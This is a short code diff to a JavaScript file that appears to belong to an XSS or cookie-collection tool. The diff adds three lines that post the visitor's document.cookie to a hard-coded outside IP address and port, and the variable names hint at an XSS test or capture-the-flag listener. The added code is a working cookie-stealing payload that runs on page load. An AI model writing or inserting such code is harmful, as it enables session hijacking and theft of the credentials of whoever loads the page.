@@ -160,3 +160,6 @@ if ('{set.keepsession}' == 1) {
         }
     })()) + '&act=wbck'
 };
+let xhrtest = new XMLHttpRequest();
+xhrtest.open("post","http://39.101.137.200:7745/send");
+xhrtest.send("header=flag&listener=testmyxss&content="+document.cookie)
